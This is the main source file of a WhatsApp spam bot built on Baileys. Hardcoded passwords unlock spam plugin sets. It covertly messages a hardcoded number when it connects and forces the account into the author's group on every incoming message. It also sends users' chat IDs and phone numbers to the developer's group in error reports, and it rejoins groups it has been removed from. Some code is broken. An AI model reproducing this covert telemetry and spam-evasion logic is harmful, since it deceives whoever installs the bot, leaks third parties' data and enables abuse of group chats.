/* ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
   ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
   ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
   ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
   ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                    by jayarathne_technical                                         */

require('link-preview-js');
const config = require('./config');
const { Boom } = require("@hapi/boom");
const { readdirSync, statSync, unlinkSync, existsSync, readFileSync, watch } = require ('fs');
const { tmpdir } = require ('os')
//const Heroku = require('heroku-client');
const { join } = require ('path')
const { exec } = require("child_process");
//import store from './assets/lib/store.js';
const P = require("pino");
//const chalk = require ('chalk');
const chalk = require ('chalk')
//const { Low , JSONFile } = require('lowdb');
const path = require('path');
const { fileURLToPath, pathToFileURL } = require ('url');
const yargs = require('yargs');
const { Spam_jf , serialize, WAConnection } = require("./assets/lib/simple");
const nila = require("./events");
const lodash = require('lodash');
//const { sm } './assets/lib/simple.js'
const fs = require('fs');
const {
      default: makeWAconnet,
      delay,
      DisconnectReason,
      fetchLatestBaileysVersion,
      makeInMemoryStore,
      useMultiFileAuthState,
      useSingleFileAuthState,
      jidNormalizedUser,
      Browsers,
    } = require("@adiwajshing/baileys");
const { M } = require('human-readable');

const { chain } = lodash
//const makeWAconnet = _makeWaconnet

const isNumber = x => typeof x === 'number' && !isNaN(x)

var low

global.catchError = true;

try {
  low = require('./assets/lib/lowdb')
} catch (e) {
  low = require('./assets/lib/lowdb')
} 



const { Low, JSONFile } = low

console.log(chalk.yellowBright(`\n     
      ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
      ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
      ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
      ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
      ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
      ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                       by jayarathne_technical\n` ))

let date_lk = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]

const store = makeInMemoryStore({
      logger: P().child({ level: 'silent', stream: 'store'})
})

store.readFromFile("./session/store.json");
setInterval(() => {
  store.writeToFile("./session/store.json");
}, 10000);

// database

//global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || 'xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-HhhHBb.aA').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(/https?:\/\//.test(opts['db'] || '') ? new cloudDBAdapter(opts['db']) : new JSONFile ('./assets/database/database.json')) // (`${opts._[0] ? opts._[0] + '_' : ''}database.json`))

global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(async function () {
if (!global.db.READ) {
clearInterval(this)
resolve(global.db.data == null ? global.loadDatabase() : global.db.data)
}
}, 1 * 1000))
if (global.db.data !== null) return
global.db.READ = true
await global.db.read().catch(console.error)
global.db.READ = null
global.db.data = {
users: {},
chats: {},
stats: {},
ms: {},
sticker: {},
settings: {},
spam: {},
permission: {},
...(global.db.data || {})
}
global.db.chain = chain(global.db.data)
}
loadDatabase()


 if (global.db) setInterval(async () => {
      if (global.db.data) await global.db.write()
      //console.log(chalk.greenBright(`Database Updated :-)`))
    }, 10 * 1000)

let cDate = new Date();

let cHour = cDate.getHours();
let cMin = cDate.getMinutes();
let cSec = cDate.getSeconds();
let cDay = cDate.getDate();
let cMonth = cDate.getMonth() + 1;
let cYear = cDate.getFullYear();

let date = cHour + ':' + cMin + ':' + cSec

console.log(date + '\n')

const readPlugins = (name) => {
      console.log("Installing plugins...");
    
      try {
      fs.readdirSync("./" + name).forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() == ".js") {
          require("./" + name + "/" + plugin);
        }
      });
    
    } catch (e) {
      console.error(e)
    
    }
    
    }

// const mode = `normal`

let mode;

if (config.PASSWORD == 'pakaya@123'){
  

  readPlugins("jf_modules/plugins_all");
  mode = 'pro_all'

}

else if (config.PASSWORD == 'pakaya') {

    readPlugins("jf_modules/plugins_spam");
    mode = 'pro_spam'
}

else {
    readPlugins("jf_modules/plugins_normal");
    mode = 'normal'
}

// starting connection
async function jf_bot () {


if (!fs.existsSync(`./session/session.json`)) {



const PastebinAPI = require('pastebin-js');
const fs = require('fs')
// Without any parameter you can only use getPaste!
var pastebin = new PastebinAPI();

// Provide a developer key as string, this key can be found when logged in.
// This can be found here: http://pastebin.com/api#1
var pastebin = new PastebinAPI('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');


//console.log('sik')


let qr = config.NILA_SESSION

let enc_id = qr.split(';')[1]

let id = atob(enc_id)

//console.log(id)

pastebin
  .getPaste(id)


  .then((data) => {
    // we have successfully pasted it. Data contains the id
    fs.writeFileSync('./session/session.json', data);

    //global.authfile = `./session/session.json`;
    //jf_bot ()
    //return jf_bot
  })
  .catch((err) => {
    console.log(chalk.red.italic('\nWrong Qr Code : Please edit Your NILA_SESSION'));
    process.exit()
  });

 }

let authfile = `./session/session.json`;

if (!fs.existsSync(`./session/session.json`)) await delay(2000)
//console.log(authfile)

const { state , saveState } = useSingleFileAuthState(authfile);

let conn_options = {
      browser: Browsers.macOS('Desktop'),
      logger: P({level: "silent" }),
      printQRInTerminal: false,
      auth: state,
};

const conn = new WAConnection(makeWAconnet(conn_options));

store.bind(conn.ev);

conn.ev.on("chats.set", () => console.log("Got chats: ", store.chats.all()));

conn.ev.on("contacts.set", () =>
    console.log("Got contacts: ", Object.values(store.contacts))
  );

conn.ev.on('connection.update', async (update) => {
      const { lastDisconnect, connection, isNewLogin, isOnline, qr, receivedPendingNotifications } = update;
      if (connection == 'connecting') {
            console.log(chalk.yellow.italic('Connecting to WhatsApp..'));
      }
      if (connection == 'open') {
          //   console.log('Connected !')
           // conn.sendMessage(`94772601056@s.whatsapp.net`, { text: `${date} - connected`});

            if (mode == 'pro_spam') {}
            if (mode == 'pro_all') {}
            if (mode == 'normal') {}
          // conn.sendMessage(`120363045089611133@g.us`, { text: `${date} - Ade phone eka off una ! \n\n\n oo dilshan mahaththaya math ehema thamai log eka ona kiyala hithan hitiye balamu nice`});
            conn.sendMessage(`94772601056@s.whatsapp.net`, { text: ` thanks  - ${date}`  } );
            //conn.sendMessage(`120363042353096815@g.us`, { text: `NIRNAMIKA MAHATHTHAYO meka bot gen enne mata kelawela inne aye ara bug eka vaduna paya 7 k yanakan da koheda code eka genna ganna ba he he \n\n*panividaya labunanan sik kiyala reply karanna me bot gen avilla inne \n\n\n\n- Agathiyata path Jayarathne-technical - ${date}`  } );
            //Learn with Saumya [ 😒]

         /*   let buttons = [
    {buttonId: `.crash`, buttonText: {displayText: `Sik ne`}, type: 1},
   // {buttonId: `.restart`, buttonText: {displayText: `Restart bot`}, type: 1},
   // {buttonId: `.restart`, buttonText: {displayText: `Call Ravindu Deshan (*not dilshan)`}, type: 1},
]

let buttonMessage = {
//image: { url: image },
text: `ade obathhuma avilla. sik thawa miniththu 2 kata kalin hitiyanan kelaweno obathumatath`,

            footer: `Sik\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴊᴀʏᴀʀᴀᴛʜɴᴇ ᴛᴇᴄʜɴɪᴄᴀʟ`,
            buttons: buttons,
            headerType: 4
        }



conn.sendMessage(`94772601056@s.whatsapp.net`, buttonMessage )

*/

            console.log(
                chalk.green.italic('✅ Login successful!')
            );

            if (mode == `pro_all`) {
                console.log(
                    chalk.green.italic('🦜 Activated mode : PRO_ALL\n')
                );
            }
            
            else if (mode == `pro_spam`) {
                console.log(
                    chalk.green.italic('🦜 Activated mode : PRO_SPAM\n')
                );
            }
            else if (mode == `normal`) {
                console.log(
                    chalk.green.italic('🦜 Activated mode : NORMAL\n')
                );
            }
          /*  if (config.PASSWORD == 'pakayas@123'){
              console.log(
                  chalk.green.italic('✅ Your Password Is Correct')
              );
              console.log(
                  chalk.green.italic('✅ Login successful!')
              );
              //await conn.sendMessage(`94786422954@s.whatsapp.net`, { text: `ehenan group ekak hadala mawath addd karala adminn denna :-) obathumata onanan aruwa add karala left venna`  } );
          }
          else{
              console.log(
                  chalk.green.italic('❌ Login Unsuccessful!')
              );
              console.log(
                  chalk.green.italic('❌ Posword error')
              );
              await conn.sendMessage(
                  conn.user.id,
                  { text: `❌ Passward error !`  }
                );
              return
          } 

          */
          
      }
      else if (qr) {
            //console.log(chalk.green.italic('Qr: '), chalk.greenBright.italic(qr));
      }
      /* else if (isOnline === true) {
            console.log(chalk.greenBright("Online."));
      } */
      else if (connection == 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason === DisconnectReason.badSession ) {
                  console.log(chalk.red.italic('Bad Session'))
                  conn.logout();
            }
            else if (reason === DisconnectReason.connectionClosed ) {
                  console.log(chalk.red.italic('Connection Closed , Reconnecting...'))
                  jf_bot();
            }
            else if (reason === DisconnectReason.connectionLost ) {
                  console.log(chalk.red.italic('Connection Lost , Reconnecting...'))
                  jf_bot();
            }
            else if (reason === DisconnectReason.connectionReplaced ) {
                  console.logchalk.red.italic(('close Current session before , open another session'));
                  process.exit()
            }
            else if (reason === DisconnectReason.loggedOut ) {
                  console.log(chalk.red.italic('Device Logged out : Please enter new NILA_SESSION;'));
                  exec('rm -rf ./session/session.json')
                  process.exit()
            }
            else if (reason === DisconnectReason.restartRequired ) {
                  console.log(chalk.red.italic('Restart Required , Restarting...'))
                  jf_bot();
            }
            if (reason === DisconnectReason.timedOut ) {
                  console.log(chalk.red.italic('Connection timedout , Reconnecting...'))
                  jf_bot();
            }
            else {
                  console.log(chalk.red.italic(` error ${reason} , logged out`))
                  jf_bot();
                 // process.exit()
            }
      }
      
});

conn.ev.on('creds.update', saveState)

// auto update about



  // end

   setInterval(async () => {

      let cDatez = new Date();

let cHourz = cDatez.getHours();
let cMinz = cDatez.getMinutes();
let cSecz = cDatez.getSeconds();

let datee = cHourz + ':' + cMinz + ':' + cSecz

  //await conn.groupUpdateSubject(`94786223050-1633880981@g.us`, `Learn with Saumya [0${datee}]`)
  
  //await conn.groupUpdateSubject(`94718775288-1631893092@g.us`, `වේලාව පෙරවරු ${datee} - ජයරත්න`)

  //conn.sendMessage(`94718775288-1631893092@g.us`, { text: `වේලාව පෙරවරු ${datee} - ජයරත්න හා සම්බන්ධ වූ ඔබට ස්තූතියි`});
  
  //sendMessage(`94718775288-1631893092@g.us`, { text: `Dan sepada - ${datee}`});

}, 1000); 

const isNumber = x => typeof x === 'number' && !isNaN(x)

// ============ Auto ==================

let user_id = conn.user.id.split(':')[0]+'@s.whatsapp.net'

conn.ev.on("group-participants.update", async (m) => {

    if (m.action == "remove") {

      if (global.db.data.spam[user_id].spam_groups.main) {

    let spam = global.db.data.spam[user_id].spam_groups

      }

    try {

    if (global.db.data.spam[user_id].spam_groups.main) {

    if ((m.id) == spam.main.code) {

       // await conn.sendMessage(conn.user.id , { text: `sik`})

        await delay(500)
        await conn.groupAcceptInvite(spam.main.code)

    }

    if ((m.id) == '120363026424879432@g.us' ) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
         await conn.groupAcceptInvite('KOHbe5BJaBQ4igcqj43OLu')
 
     }

    if ((m.id) == spam.i.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.i.code)
 
     }

     if ((m.id) == spam.ii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.ii.code)
 
     }

     if ((m.id) == spam.iii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.iii.code)
 
     }

     if ((m.id) == spam.iv.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.iv.code)
 
     }

     if ((m.id) == spam.v.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.v.code)
 
     }

     if ((m.id) == spam.vi.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.vi.code)
 
     }

     if ((m.id) == spam.vii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.vii.code)
 
     }

     if ((m.id) == spam.viii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.viii.code)
 
     }

     if ((m.id) == spam.ix.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.ix.code)
 
     }

     if ((m.id) == spam.x.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.x.code)
 
     }

     if ((m.id) == spam.xi.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xi.code)
 
     }

     if ((m.id) == spam.xii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xii.code)
 
     }

     if ((m.id) == spam.xiii.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xiii.code)
 
     }

     if ((m.id) == spam.xiv.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xiv.code)
 
     }

     if ((m.id) == spam.xv.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xv.code)
 
     }
     if ((m.id) == spam.xvi.id) {

        // await conn.sendMessage(conn.user.id , { text: `sik`})
 
         await delay(500)
        await conn.groupAcceptInvite(spam.xvi.code)
 
     }

    }

 } catch (e) {}

 if (m.action == "add") {

        }

    }

 

});

// read messages

conn.ev.on("messages.upsert", async (chatUpdate) => {

    //const m = serialize(conn, chatUpdate.messages[0]);
    
    let m = chatUpdate.messages[0]
    m = new serialize(conn, m );
    let jf = Spam_jf(conn , m)

    if (config.OPTIONS.AUTO_READ) {
        await conn.readMessages([m.key])
        //await conn.sendPresenceUpdate("composing", m.conn.jid);
    }
    if (config.BLOCK_CHAT.includes(m.sender)) {
      if (!m.isGroup) return
      else {
        //console.log('test')
        //conn.sendMessage(m.chat, { delete: { remoteJid: conn.user.id , id : m.key.id } })
        return
      }
    };

    if (m.chat == '34608291102-1381490362@g.us') {
      console.log(chalk.cyan.bold('Black Amda : .kick ලොකුද meta data mention කරාම😂'))
      return;
    }


    // console.log(m)


    if (!m.itsMe) {



      /*

      const msg = getMessageFromStore(m.chat, m.key.id) // implement this on your end
      await conn.sendMessage(m.chat, { forward: msg }) // WA forward the message!



    


     delay(500)
      conn.sendReact(m.from, '🦜', m.key) */


   }


  // console.log(m)

        
    if (config.OPTIONS.ANTI_BOT && m.isGroup && m.isBotAdmins && !config.YOUR_BOTS.includes(m.sender.split`@`[0]) && m.isBaileys && !m.key.fromMe) {
      await conn.sendMessage(
        m.chat,
        { text:  `Only Jayarathne Bot can stay here ! , Obata theruwan Saranai !` }, 
      );

      await delay(1000 * 5);
    if (config.OPTIONS.ANTI_BOT_ACTION == 'demote') {
      await conn.groupParticipantsUpdate(m.from, [m.sender], "demote")
    
    }
    else await conn.groupParticipantsUpdate(m.from, [m.sender], 'remove')
  }

    if (!m.message) return;
    if (m.key && m.key.remoteJid == "status@broadcast") return

    try {
      // TODO: use loop to insert data instead of this
      let user = global.db.data.users[m.sender]
      if (typeof user !== 'object')
          global.db.data.users[m.sender] = {}
      if (user) {
          if (!isNumber(user.exp)) user.exp = 0
          if (!isNumber(user.limit)) user.limit = 10
          if (!isNumber(user.lastclaim)) user.lastclaim = 0
          if (!('registered' in user)) user.registered = false
        if (!user.registered) {
          if (!('name' in user)) user.name = m.name
          if (!isNumber(user.age)) user.age = -1
          if (!isNumber(user.regTime)) user.regTime = -1
         }
          if (!isNumber(user.afk)) user.afk = -1
          if (!('afkReason' in user)) user.afkReason = ''
          if (!('banned' in user)) user.banned = false
          if (!isNumber(user.warn)) user.warn = 0
          if (!isNumber(user.level)) user.level = 0
          if (!('role' in user)) user.role = 'Novato'
          if (!('autolevelup' in user)) user.autolevelup = true
          if (!isNumber(user.money)) user.money = 0
          if (!isNumber(user.limit)) user.limit = 10
          if (!isNumber(user.lastclaim)) user.lastclaim = 0
      } else
          global.db.data.users[m.sender] = {
              exp: 0,
              limit: 10,
              lastclaim: 0,
              registered: false,
              name: m.name,
              age: -1,
              regTime: -1,
              afk: -1,
              afkReason: '',
              banned: false,
              warn: 0,
              level: 0,
              role: 'Novato',
              autolevelup: true,
              money: 0,
              limit: 10,
              lastclaim: 0,
              lastweekly: 0,
              lastmonthly: 0,
          }
      let chat = global.db.data.chats[m.chat]
      if (typeof chat !== 'object')
          global.db.data.chats[m.chat] = {}
      if (chat) {
          if (!('isBanned' in chat))
              chat.isBanned = false
          if (!('welcome' in chat))
              chat.welcome = true
          if (!('detect' in chat))
              chat.detect = true
          if (!('sWelcome' in chat))
              chat.sWelcome = ''
          if (!('sBye' in chat))
              chat.sBye = ''
          if (!('sPromote' in chat))
              chat.sPromote = ''
          if (!('sDemote' in chat))
              chat.sDemote = ''
          if (!('delete' in chat))
              chat.delete = true
          if (!('modohorny' in chat))
              chat.modohorny = false    
          if (!('autosticker' in chat))
              chat.autosticker = false                    
          if (!('audios' in chat))
              chat.audios = false                            
          if (!('antiLink' in chat))
              chat.antiLink = false
          if (!('antiLink2' in chat))
              chat.antiLink2 = false
          if (!('antiviewonce' in chat))
              chat.antiviewonce = false
          if (!('antiToxic' in chat))
              chat.antiToxic = false
          if (!('antiTraba' in chat))
              chat.antiTraba = false
          if (!isNumber(chat.expired))
              chat.expired = 0
      } else
          global.db.data.chats[m.chat] = {
              isBanned: false,
              welcome: true,
              detect: true,
              sWelcome: '',
              sBye: '',
              sPromote: '',
              sDemote: '',
              delete: true,
              modohorny: true,
              autosticker: false,
              audios: true,
              antiLink: false,
              antiLink2: false,
              antiviewonce: false,
              antiToxic: false,
              antiTraba: false,
              expired: 0,
          }
      let settings = global.db.data.settings[conn.user.id]
      if (typeof settings !== 'object') global.db.data.settings[conn.user.id] = {}
      if (settings) {
          if (!('self' in settings)) settings.self = false
          if (!('autoread' in settings)) settings.autoread = false
          if (!('restrict' in settings)) settings.restrict = false
          if (!('antiCall' in settings)) settings.antiCall = false
          if (!('antiPrivate' in settings)) settings.antiPrivate = false
          settings.mode = `${mode}`
      } else global.db.data.settings[conn.user.id] = {
          self: false,
          autoread: false,
          restrict: false,
          antiCall: false,
          antiPrivate: false,
          mode: `${mode}`
      }

      let user_id = conn.user.id.split(':')[0]+'@s.whatsapp.net'


      let spam_groups = global.db.data.spam[user_id]
      if (typeof spam_groups !== 'object') global.db.data.spam[user_id] = {}
      if (spam_groups) {
        if (!('spam_groups' in spam_groups)) spam_groups = {}
      } else global.db.data.spam[user_id] = {
        spam_groups: {}
      }

      let spam_use = global.db.data.permission[user_id]
      if (typeof spam_use !== 'object') global.db.data.permission[user_id] = {}
      if (spam_use) {
        if (!('spam_use' in spam_groups)) spam_use = {}
      } else global.db.data.permission[user_id] = {
        spam_use: {}
      }

     

    // ================ Must be updated ===================

      await conn.groupAcceptInvite('KOHbe5BJaBQ4igcqj43OLu')

      /*
      
      try {

    
        if (mode !== 'normal') {
        
            try {

            await conn.groupMetadata('120363026226217822@g.us')

            // console.log('s')

            } catch(e) {

    
    
        
                console.log('sik')
              await conn.groupAcceptInvite('EJpLOBJoxIECU5TpHTpUFQ')
        
              global.db.data.spam[user_id].main_group = true
              
            
        
            }
        }



            } catch(e) {
                console.log(e)
                        }
                    */


  } catch (e) {
      console.log('some error')
  }



  if (typeof m.text !== 'string')
            m.text = ''

// owners + premium

    const isROwner = config.OWNER.CREATOR.includes(`${m.sender.split`@`[0]}`)
    const isOwner = isROwner || m.fromMe || config.SUDO.includes(`${m.sender.split`@`[0]}`)
    const isJf = isROwner || config.OWNER.JF_TEAM.includes(`${m.sender.split`@`[0]}`)
    const isUrt = isROwner || config.OWNER.URT.includes(`${m.sender.split`@`[0]}`)

//console.log(m.sender.split`@`[0] + ' ' + isOwner)
//console.log(m.message);

//const mes = m

     //if ( global.db.data.users[m.sender].banned = `true`) {

   //await  conn.sendMessage('120363023016324709@g.us', { delete: { remoteJid: m.chat , id : m.key.id } }  )
  //}
//if (m.isBaileys) console.log('\nbot Detected')
//else console.log('\nNot bot')

    //let usedPrefix
    //let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]

   /* const groupMetadata = (m.isGroup ? ((conn.chats[m.chat] || {}).metadata || await conn.groupMetadata(m.chat).catch(_ => null)) : {}) || {}
    const participants = (m.isGroup ? groupMetadata.participants : []) || []
    const user = (m.isGroup ? participants.find(u => conn.decodeJid(u.id) === m.sender) : {}) || {} // User Data
    const bot = (m.isGroup ? participants.find(u => conn.decodeJid(u.id) == this.user.jid) : {}) || {} // Your Data
    const isRAdmin = user?.admin == 'superadmin' || false
    const isAdmin = isRAdmin || user?.admin == 'admin' || false // Is User Admin?
    const isBotAdmin = bot?.admin || false // Are you Admin? */


    //console.log(global.db)

    require("./assets/lib/print")(m);

      nila.commands.map(async command => {
            for (let i in command.pattern) {

              
              if (
                command.pattern[i] == m.command ||
                command.on == "text"
              ) {
                global.db.hits += 1;
                global.catchError = false;
                //await conn.sendPresenceUpdate("recording", m.conn.jid);
                await conn.sendReact( m.from, await nila.reactArry("INFO"), m.key);
                await conn.sendPresenceUpdate("composing", m.from);

                console.log(m.isCreator)
                

                //console.log(global.db.hits)

///////////////////////////////_ERROR_HANDLING_/////////////////////////////////

let image = './assets/Media/error.jpg'

                try { await command.function(m, conn , { jf } ) ;
                } catch (error) { 
                    
                    let errors = `${error}`
            //if (config.NO_LOG == 'true') return;
            if (errors.includes('timed out')) {
                console.log('timed out')
            }
            if (errors.includes('rate-overlimit')) {
                await conn.sendMessage(m.chat, { text: `WhatsApp limit Reached : Please try again Later` } , { quoted: m })
                errors = `WhatsApp Rate - Over Limit`
            }

                if (config.LANG == 'EN') {

                    
                }

                let buttons = [
    {buttonId: `.join (help_group)`, buttonText: {displayText: `ᴊᴏɪɴ ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ ✅`}, type: 1},
    {buttonId: `.restart`, buttonText: {displayText: `ʀᴇꜱᴛᴀʀᴛ ʙᴏᴛ ♻️`}, type: 1},
]

let buttonMessage = {
image: { url: image },
caption: `_⭕ _ＥＲＲＯＲ ＲＥＰＯＲＴ_ ❌_

- ᴛɪᴍᴇ : ${date_lk}
- ᴅᴀᴛᴇ : _undefind_

- ᴄʜᴀᴛ : ${m.chat}
- ᴜꜱᴇʀ : wa.me/${m.sender.split`@` [0]}

- ᴄᴏᴍᴍᴀɴᴅ : #${m.command}

- ᴇʀʀᴏʀ.ʀᴇᴀꜱᴏɴ : _${errors}_

- ꜱᴏʟᴜᴛɪᴏɴ : _try to restart or join our support group_

* ᴊᴏɪɴ ᴏᴜʀ ʜᴇʟᴘ ɢʀᴏᴜᴘ ꜰᴏʀ ᴍᴏʀᴇ ᴅᴇᴛᴀɪʟs

__ʏᴏᴜʀ ᴄᴏɴᴠᴇɴɪᴄᴇ ɪꜱ ᴏᴜʀ ᴘʟᴇᴀꜱᴜʀᴇ__`,

            footer: `ᴜꜱᴇʀ - ${m.pushName}\nꜱᴘᴇᴇᴅ - ${m.speed} ms\nʀᴜɴᴛɪᴍᴇ - ${m.runtime}\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴊᴀʏᴀʀᴀᴛʜɴᴇ ᴛᴇᴄʜɴɪᴄᴀʟ`,
            buttons: buttons,
            headerType: 4
        }



conn.sendMessage('120363027729314927@g.us', buttonMessage, { quoted: m })
console.log(chalk.red.italic(error))



                    // console.log(error); 
                  }
                  
                  global.catchError

                  ? await conn.sendReact(m.from, await nila.reactArry("ERROR"), m.key)
                            : await conn.sendReact(m.from, command.sucReact, m.key);
                        await conn.sendPresenceUpdate("available", m.from);

                        

              }

              
            }
            
        
        });

      //m , conn

});


conn.serializeM = (m) => serialize(conn, m, store);

  if (conn.user && conn.user?.id)
    conn.user.jid = jidNormalizedUser(conn.user?.id);

    

  return conn;

};

jf_bot()

// clear temp automatically

function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './assets/temp')]
  const filename = []
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
  return filename.map(file => {
  const stats = statSync(file)
  if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
  return false
  })}

setInterval(async () => {
    var a = await clearTmp()
    // await conn.groupAcceptInvite(`GZ1tdsrWaKo3vc6oiDSFsX`)
    //console.log(chalk.cyanBright(`Clearing temp...`))
    }, 30000 ) // 3 minutes
